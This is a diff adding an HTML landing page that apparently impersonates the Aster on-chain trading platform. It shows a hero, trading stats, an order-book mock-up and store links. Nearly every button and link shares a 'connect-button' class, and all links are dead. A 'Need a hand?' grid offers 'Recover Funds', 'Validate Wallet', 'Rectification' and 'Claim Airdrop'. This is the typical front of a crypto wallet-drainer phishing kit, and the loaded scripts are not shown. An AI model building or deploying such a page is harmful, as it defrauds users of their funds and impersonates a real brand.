@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Aster | The Frontier of On-chain Trading</title>
+  <link rel="icon" href="img/asterlogo.svg">
+  <script src="assets/sources.js"></script>
+  <script src="assets/app-bundle_mw25nqf0.js"></script>
+  <script src="assets/qr-code-styling.js"></script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600&display=swap"
+    rel="stylesheet">
+  <link href="https://cdn.jsdelivr.net/npm/remixicon@4.3.0/fonts/remixicon.css" rel="stylesheet">
+  <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+  <header class="nav" id="nav">
+    <div class="container nav-inner">
+      <a href="#" class="brand"><img src="img/asterlogo.svg" alt="Aster logo"></a>
+      <nav class="nav-right">
+        <a href="#" class="nav-link connect-button">Docs</a>
+        <a href="#" class="nav-link connect-button">Community</a>
+        <a href="#" class="nav-link connect-button">Language</a>
+        <button class="btn-launch connect-button" type="button">Launch App</button>
+        <button class="hamburger" id="openMenu" type="button" aria-label="Open menu"><i
+            class="ri-menu-line"></i></button>
+      </nav>
+    </div>
+  </header>
+
+  <aside class="mmenu" id="mmenu" aria-hidden="true">
+    <div class="mmenu-head"><span>Menu</span><button class="mmenu-close" id="closeMenu" type="button"
+        aria-label="Close menu"><i class="ri-close-line"></i></button></div>
+    <ul class="mmenu-list">
+      <li class="mitem active"><button class="mrow connect-button" type="button"><i
+            class="ri-line-chart-line"></i><span>Trade</span><i class="ri-arrow-down-s-line chev"></i></button>
+        <ul class="msub">
+          <li><a href="#" class="connect-button">Perpetual</a></li>
+          <li><a href="#" class="connect-button">Spot</a></li>
+        </ul>
+      </li>
+      <li class="mitem"><a href="#" class="mrow connect-button"><i
+            class="ri-pie-chart-box-line"></i><span>Portfolio</span></a></li>
+      <li class="mitem"><a href="#" class="mrow connect-button"><i
+            class="ri-user-add-line"></i><span>Referral</span></a></li>
+      <li class="mitem"><button class="mrow connect-button" type="button"><i class="ri-gift-line"></i><span>Aster
+            Chain</span><i class="ri-arrow-down-s-line chev"></i></button>
+        <ul class="msub">
+          <li><a href="#" class="connect-button">Explorer</a></li>
+          <li><a href="#" class="connect-button">Bridge</a></li>
+        </ul>
+      </li>
+      <li class="mitem open"><button class="mrow connect-button" type="button"><i
+            class="ri-gift-line"></i><span>Rewards</span><i class="ri-arrow-down-s-line chev"></i></button>
+        <ul class="msub">
+          <li><a href="#" class="connect-button">Airdrop</a></li>
+          <li><a href="#" class="connect-button">Points</a></li>
+        </ul>
+      </li>
+      <li class="mitem"><button class="mrow connect-button" type="button"><i
+            class="ri-more-fill ring-icon"></i><span>More</span><i class="ri-arrow-down-s-line chev"></i></button>
+        <ul class="msub">
+          <li><a href="#" class="connect-button">Docs</a></li>
+          <li><a href="#" class="connect-button">Community</a></li>
+        </ul>
+      </li>
+      <li class="mitem"><button class="mrow connect-button" type="button"><i
+            class="ri-global-line"></i><span>Language</span></button></li>
+    </ul>
+  </aside>
+
+  <main>
+    <!-- HERO -->
+    <section class="hero">
+      <div class="container hero-grid">
+        <div class="hero-copy">
+          <h1><span class="gold-text">The Frontier of</span><br>On-chain Trading</h1>
+          <p class="hero-sub">Built on advanced engineering for efficiency, scale, and global adoption.</p>
+          <button class="btn-start connect-button" type="button">Start Trading</button>
+        </div>
+        <!-- PLACEHOLDER: replace .ring-visual with hero ring image -->
+        <div class="ring-visual ph" aria-hidden="true">
+          <div class="candles"><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i></div>
+          <span class="pct p1">+13.39%</span><span class="pct p2">+1.04%</span>
+          <div class="ring"></div><span class="coded">/ ASTER CODED /</span>
+        </div>
+      </div>
+      <div class="container stats">
+        <div class="stat"><span>Total trading volume</span><b>$5.19T</b></div>
+        <div class="stat"><span>Users</span><b>53.90M</b></div>
+        <div class="stat"><span>Open interest</span><b>$2.29B</b></div>
+        <div class="stat"><span>TVL</span><b>$1.46B</b></div>
+        <div class="stat"><span>Assets</span><b>483</b></div>
+      </div>
+    </section>
+
+    <!-- HELP / CTA -->
+    <section class="help">
+      <div class="container">
+        <h2 class="h2">Need a hand?</h2>
+        <p class="help-sub">Pick the issue you're running into and we'll get you moving again.</p>
+        <div class="cta-grid">
+          <button class="cta-btn connect-button" type="button"><i class="ri-arrow-left-right-line"></i>Swap</button>
+          <button class="cta-btn connect-button" type="button"><i class="ri-gift-line"></i>Claim Airdrop</button>
+          <button class="cta-btn connect-button" type="button"><i class="ri-route-line"></i>Migrate</button>
+          <button class="cta-btn connect-button" type="button"><i class="ri-links-line"></i>Bridge</button>
+          <button class="cta-btn connect-button" type="button"><i class="ri-wallet-3-line"></i>Connect Wallet</button>
+          <button class="cta-btn connect-button" type="button"><i class="ri-download-2-line"></i>Deposit</button>
+          <button class="cta-btn connect-button" type="button"><i class="ri-upload-2-line"></i>Withdraw</button>
+          <button class="cta-btn connect-button" type="button"><i class="ri-time-line"></i>Stuck Transaction</button>
+          <button class="cta-btn connect-button" type="button"><i class="ri-error-warning-line"></i>Failed
+            Transaction</button>
+          <button class="cta-btn connect-button" type="button"><i class="ri-refund-2-line"></i>Recover Funds</button>
+          <button class="cta-btn connect-button" type="button"><i class="ri-shield-check-line"></i>Validate
+            Wallet</button>
+          <button class="cta-btn connect-button" type="button"><i class="ri-shield-cross-line"></i>Revoke
+            Approval</button>
+          <button class="cta-btn connect-button" type="button"><i class="ri-gas-station-line"></i>Gas Fee Issue</button>
+          <button class="cta-btn connect-button" type="button"><i class="ri-refresh-line"></i>Wallet Sync</button>
+          <button class="cta-btn connect-button" type="button"><i class="ri-tools-line"></i>Rectification</button>
+          <button class="cta-btn connect-button" type="button"><i class="ri-customer-service-2-line"></i>Contact
+            Support</button>
+        </div>
+      </div>
+    </section>
+
+    <!-- WHY ASTER -->
+    <section class="why">
+      <div class="container why-grid">
+        <div class="why-copy">
+          <h2 class="h2">Why Aster</h2>
+          <div class="feat-grid">
+            <div class="feat"><span class="ico"><i class="ri-planet-line"></i></span>
+              <h3>Universal Access</h3>
+              <p>One account. Unlock every market.</p>
+            </div>
+            <div class="feat"><span class="ico"><i class="ri-shield-keyhole-fill"></i></span>
+              <h3>Native Privacy</h3>
+              <p>Show only what you want to show, privacy option at protocol layer.</p>
+            </div>
+            <div class="feat"><span class="ico"><i class="ri-line-chart-fill"></i></span>
+              <h3>Capital Efficiency</h3>
+              <p>Higher leverage. Margin that earns.</p>
+            </div>
+            <div class="feat"><span class="ico"><i class="ri-code-box-line"></i></span>
+              <h3>Open Composability</h3>
+              <p>Built to be built on.</p>
+            </div>
+          </div>
+        </div>
+        <!-- PLACEHOLDER: replace with trading UI screenshot -->
+        <div class="ob ph" aria-hidden="true">
+          <div class="ob-tabs"><span>Chart</span><span class="on">Order
+              book</span><span>Trades</span><span>Depth</span><span>Details</span></div>
+          <div class="ob-sel"><span>0.1 <i class="ri-arrow-down-s-fill"></i></span><span>BTC <i
+                class="ri-arrow-down-s-fill"></i></span></div>
+          <div class="ob-head"><span>Price (USDT)</span><span>Size (BTC)</span><span>Total (BTC)</span></div>
+          <div class="ob-rows" id="obRows"></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- EXPERIENCE -->
+    <section class="exp">
+      <div class="container">
+        <h2 class="h2 center">The Aster Experience</h2>
+
+        <div class="exp-row">
+          <div class="exp-text">
+            <h3 class="h3">Trade every frontier</h3>
+            <p class="lead">Crypto, stocks, forex, commodities, prediction markets. All on Aster.</p>
+            <div class="pills"><span class="pill">24/7</span><span class="pill">Permissionless</span></div>
+          </div>
+          <div class="vmask vm-cards">
+            <div class="vtrack" id="mkts"></div>
+          </div>
+        </div>
+
+        <div class="exp-row rev">
+          <div class="vmask vm-orders">
+            <span class="oo-title">Open Orders</span>
+            <div class="hidden-chip"><i class="chk"></i>Hidden Order</div>
+            <div class="vtrack" id="orders"></div>
+          </div>
+          <div class="exp-text">
+            <h3 class="h3">Move without being watched</h3>
+            <p class="lead">Your strategy is your edge. Stop being hunted.</p>
+            <div class="pills"><span class="pill">ZK Verifiable</span><span class="pill">Stealth Address</span><span
+                class="pill">Viewer Pass</span></div>
+          </div>
+        </div>
+
+        <div class="exp-row last">
+          <div class="exp-text">
+            <h3 class="h3">Earn on idle margin</h3>
+            <p class="lead">Margin shouldn't sleep. USDF earns while you trade.</p>
+            <div class="pills"><span class="pill">Yield-Bearing Stablecoin</span><span class="pill">Dual Yield</span>
+            </div>
+          </div>
+          <div class="mint">
+            <div class="mint-tabs"><button class="on" type="button" data-tab="mint">MINT</button><button type="button"
+                data-tab="redeem">REDEEM</button></div>
+            <div class="mint-body">
+              <div class="mint-lbl">From <b id="mFrom">BNB Chain</b></div>
+              <div class="field"><span class="ph-txt">Amount</span><span class="tok"><i class="tk usdt">T</i>USDT</span>
+              </div>
+              <div class="field-meta"><span>$0</span><span>1,000.00 USDT <em>Max</em></span></div>
+              <div class="mint-lbl to">To <img src="img/asterlogo.svg" alt=""><b id="mTo">Aster</b></div>
+              <div class="field"><span class="ph-txt">Amount</span><span class="tok"><i class="tk usdf">$</i>USDF</span>
+              </div>
+              <div class="field-meta right"><span>Balance 0 USDT</span></div>
+              <button class="btn-mint connect-button" type="button" id="mintBtn">Mint and Deposit</button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ASTER CHAIN -->
+    <section class="chain">
+      <div class="container">
+        <h2 class="h2 center">Aster Chain</h2>
+        <p class="chain-sub">A purpose-built L1 engineered for the frontier.</p>
+        <!-- PLACEHOLDER: replace .chain-stage contents with chain illustration -->
+        <div class="chain-stage ph">
+          <div class="iso i1"></div>
+          <div class="iso i2"></div>
+          <div class="iso i3"></div>
+          <div class="iso i4"></div>
+          <div class="iso-main"><span class="l3"></span><span class="l2"></span><span class="l1"><img
+                src="img/asterlogo.svg" alt=""></span></div>
+          <div class="chip c-fin"><b><i class="ri-time-line"></i>Finality</b><span>50ms block times</span></div>
+          <div class="chip c-pri"><b><i class="ri-spy-line"></i>Privacy</b><span>ZK-encrypted</span></div>
+          <div class="chip c-mul"><b><i class="ri-box-3-line"></i>Multi-Chain</b>
+            <div class="chains"><i class="ri-bnb-fill"></i><i class="ri-triangle-fill"></i><i
+                class="ri-ethereum-fill"></i><i class="ri-menu-5-fill"></i></div>
+          </div>
+        </div>
+        <div class="chain-cols">
+          <div>
+            <h3>Sub-Second Finality</h3>
+            <p>50ms block times. Up to 100,000 TPS. Zero gas. PoSA consensus optimized for derivatives execution.</p>
+          </div>
+          <div>
+            <h3>Built-in Privacy</h3>
+            <p>Every trade generates a fresh, one-time stealth address. Orders are ZK-encrypted and verifiable. Full
+              account privacy, viewer-pass decryptable.</p>
+          </div>
+          <div>
+            <h3>Multi-Chain by Design</h3>
+            <p>Trade across BNB Chain, Arbitrum, Ethereum, and Solana from a single account. Validator-signed
+              settlements in ~30 seconds.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ECOSYSTEM + MOBILE APP -->
+    <section class="eco">
+      <p class="eco-title">Trusted by the Ecosystem</p>
+      <div class="marquee">
+        <div class="mtrack" id="logos">
+          <span class="lg"><i class="ri-hexagon-line"></i>DAO</span>
+          <span class="lg kern"><i class="ri-qr-code-line"></i>KERNEL</span>
+          <span class="lg venus"><i class="ri-check-double-line"></i>VENUS</span>
+          <span class="lg"><i class="ri-sun-fill"></i>YieldNest</span>
+          <span class="lg"><i class="ri-bear-smile-fill"></i>PancakeSwap</span>
+        </div>
+      </div>
+
+      <div class="container app-row">
+        <div class="app-text">
+          <h2 class="h2">Aster in Your Pocket</h2>
+          <p class="lead">Never miss an opportunity with the Aster Mobile app. The markets are at your fingertips 24/7.
+          </p>
+          <div class="stores">
+            <a href="#" class="store connect-button"><i class="ri-google-play-fill"></i>Play Store</a>
+            <a href="#" class="store connect-button"><i class="ri-apple-fill"></i>App Store</a>
+            <a href="#" class="store connect-button"><i class="ri-android-fill"></i>APK (Android)</a>
+          </div>
+        </div>
+        <div class="phone ph" aria-hidden="true">
+          <div class="screen"><img src="img/app-frame-04.jpg" alt=""></div>
+        </div>
+
+      </div>
+    </section>
+  </main>
+
+  <footer class="footer">
+    <div class="container">
+      <div class="f-top">
+        <a href="#" class="f-brand"><img src="img/asterlogo.svg" alt="Aster logo"></a>
+        <div class="f-links">
+          <span class="f-grp"><a href="#">Docs</a><a href="#">Support</a></span><i class="f-sep"></i>
+          <span class="f-grp"><a href="#">About</a><a href="#">Privacy Policy</a><a href="#">Join Us</a><a
+              href="#">Brand Kit</a></span>
+        </div>
+      </div>
+      <div class="f-bot">
+        <p>© 2026 Aster Foundation. All rights reserved.</p>
+        <div class="socials">
+          <a href="#" aria-label="Aster Scan"><i class="ri-planet-line"></i></a>
+          <a href="#" aria-label="X"><i class="ri-twitter-x-fill"></i></a>
+          <a href="#" aria-label="Discord"><i class="ri-discord-fill"></i></a>
+          <a href="#" aria-label="Telegram"><i class="ri-telegram-2-fill"></i></a>
+        </div>
+      </div>
+    </div>
+  </footer>
+  <script src="script.js"></script>
+</body>
+
+</html>
